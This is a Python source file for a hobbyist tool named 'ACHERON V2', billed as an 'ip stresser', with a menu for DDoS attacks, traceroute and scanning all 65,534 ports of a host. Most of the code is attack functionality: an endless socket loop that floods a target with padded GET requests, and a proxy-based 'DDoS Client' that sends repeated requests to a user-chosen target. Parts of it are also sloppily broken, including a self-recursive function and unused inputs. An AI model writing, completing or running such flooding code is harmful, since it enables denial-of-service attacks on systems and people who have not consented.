import colorama
import pyfiglet
import pystyle
import sys
import requests
import ctypes
import socket
import getpass
import scapy
from scapy.all import IP, ICMP, sr1
import threading
import random
import time
import datetime
import platform
import os

from datetime import datetime
from pystyle import *

from colorama import Fore, Back, Style
colorama.init()

blue = Fore.BLUE
cyan = Fore.CYAN
operatingsys = platform.system()
directory = os.getcwd()
username = getpass.getuser()
sysname = socket.gethostname()
num_threads = 10


if operatingsys == 'Windows':
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 ACHERON V2 』~ by ven - v0.1.0 - ")

def attack(target, port):
    socket.setdefaulttimeout(1)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /? " + "A" * 500).encode(), (target, port))
            s.close()
        except Exception as e:
            pass

def error():
  print()
  print(Fore.RED + 'Sorry, ACHERON V2 ran into an error.')
  prompt()

def prompt():
  print()
  prompt = input(f'{blue}════{cyan}{directory}{blue}══{cyan}{username}{blue}══>{cyan} ')

  if prompt == '1':
    stressip()
  
  elif prompt == '2':
    traceroute()

  elif prompt == '3':
     scan()

  elif prompt == '4':
    sys.exit()

  else:
    error()

def connect_and_send(ip):

  global PROXY_PORT
  global NUM_CONNS
  global CONNECTION_TIMEOUT
  global TARGET
  try:
       # Connect to the target through a proxy
          proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          proxy_sock.settimeout(CONNECTION_TIMEOUT)
          proxy_sock.connect((ip, PROXY_PORT))
          # Connect to the target domain through the proxy
          target_sock = socket.create_connection((TARGET, 80), timeout=CONNECTION_TIMEOUT)

          # Send HTTP GET request through the proxy to the target
          proxy_sock.sendall(
              b'GET / HTTP/1.1\r\nHost: ' + TARGET.encode() + b'\r\n\r\n')

          while True:
              if random.random() < 0.01:  # Add randomness to the attack
                  proxy_sock.sendall(b'GET / HTTP/1.1\r\nHost: ' + TARGET.encode() + b'\r\n\r\n')

              data = target_sock.recv(1024)
              if not data:
                  break

              proxy_sock.sendall(data)  # Forward the response back to the proxy

          target_sock.close()

  except Exception as e:
          print(f"Error connecting to target or proxy: {e}", file=sys.stderr)
  finally:
          proxy_sock.close()

  # Main program
  print("DDoS Client Started...")
  # Resolve target IP and create a socket to send requests from
  target_ip = socket.gethostbyname(TARGET)
  for i in range(NUM_CONNS):
      print(f"[ Connection #{i+1} ] Connecting to target with IP: {target_ip}")
      connect_and_send(target_ip)
      print(f"[ Connection #{i+1} ] Connection closed")
      time.sleep(random.uniform(2, 5))  # Add randomness to the attack

  print("DDoS Client Finished...")
  print()
  prompt()

def stressip():

  global TARGET
  global PROXY_PORT
  global NUM_CONNS
  global CONNECTION_TIMEOUT
  print()
  print(f'{blue}Input the IP you want to stress.')
  TARGET = input(f'{cyan} > ')
  print(f'{blue}Input an open port of the IP.')
  port = input(f'{cyan} > ')

  PROXY_PORT = 808
  NUM_CONNS = 100
  CONNECTION_TIMEOUT = 5
  connect_and_send(TARGET)


def scan():
    print()
    print('What is the IP you want to scan?')
    target = input(str(f"{cyan}Target IP: "))
    print(Fore.BLUE + "~" * 50,)
    print(Fore.CYAN + "Scanning Target: " + target)
    print("Scanning started at: " + str(datetime.now()))
    print(Fore.BLUE + '~'*50)
    
    try:

        for port in range(1,65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.5)

            result = s.connect_ex((target,port))
            if result == 0:
                print('[*] Port {} is open.'.format(port))
            s.close()

    except KeyboardInterrupt:
        print('\n Exiting')
        input()
        prompt()
    except socket.error:
        print('\n Host not responding')
        prompt()

def traceroute():
    max_hops = 100
    print()
    print(f'{blue}What is the IP/Domain destination?')
    destination = input(str(f"{cyan}IP/Domain destination: "))
    print(f"{blue}~" * 50,)
    print(f"{cyan}Finding traceroute of: " + destination)
    print("Traceroute started at: " + str(datetime.now()))
    print(f'{blue}~'*50)

    print(f"{blue}Tracerouting to {destination}...")
    
    for ttl in range(1, max_hops+1):
        # Send an ICMP Echo Request packet with the TTL value
        pkt = IP(dst=destination, ttl=ttl) / ICMP()
        reply = sr1(pkt, timeout=5, verbose=0)
        
        if reply is None:
            print(f"{ttl}: Request Timed Out")
        elif reply.type == 0:
            print(f"{ttl}: {reply.src} (Destination reached)")
            break
        else:
            print(f"{ttl}: {reply.src}")

    prompt()

Write.Print(f'''
      
                █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ███╗   ██╗    ██╗   ██╗██████╗ 
               ██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗██╔═══██╗████╗  ██║    ██║   ██║╚════██╗
               ███████║██║     ███████║█████╗  ██████╔╝██║   ██║██╔██╗ ██║    ██║   ██║ █████╔╝
               ██╔══██║██║     ██╔══██║██╔══╝  ██╔══██╗██║   ██║██║╚██╗██║    ╚██╗ ██╔╝██╔═══╝ 
               ██║  ██║╚██████╗██║  ██║███████╗██║  ██║╚██████╔╝██║ ╚████║     ╚████╔╝ ███████╗
               ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝  ╚══════╝
               developed by ven - ip stresser plus other stuff ig         ~~~            v0.2.0
             ====================================================================================
            
                                   ╔════════════════════════════════════╗
                                   ║ [1] DDoS IP Address                ║
                                   ║ [2] Perform Traceroute             ║
                                   ║ [3] Scan IP for Open Ports         ║
                                   ║ [4] Exit                           ║
                                   ╚════════════════════════════════════╝
            
      '''
      ,Colors.blue_to_cyan, interval=0.000)



prompt()




